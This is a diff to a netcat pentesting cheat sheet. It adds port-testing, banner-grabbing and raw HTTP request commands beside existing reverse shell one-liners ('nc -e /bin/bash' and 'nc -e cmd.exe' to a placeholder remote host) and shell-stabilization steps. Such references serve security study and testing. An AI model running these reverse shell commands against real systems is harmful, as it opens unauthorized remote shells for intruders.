@@ -25,6 +25,24 @@ nc -e /bin/bash <RHOST> <RPORT>
 nc -e cmd.exe <RHOST> <RPORT>
 ```
 
+## investigate ports
+
+- test port
+```
+nc -zv <RHOST> <RPORT>
+```
+
+- get banner
+```
+echo "QUIT" | nc <RHOST> <RPORT>
+```
+
+- send http request
+```
+printf "GET / HTTP/1.0\r\n\r\n" | nc <RHOST> <RPORT>
+```
+
+
 ## Stabilize Reverse Shell
 
 ```
@@ -33,6 +51,9 @@ export TERM=xterm
 Ctrl z
 stty raw -echo; fg
 ```
+
+
+
 
 ## Links
 
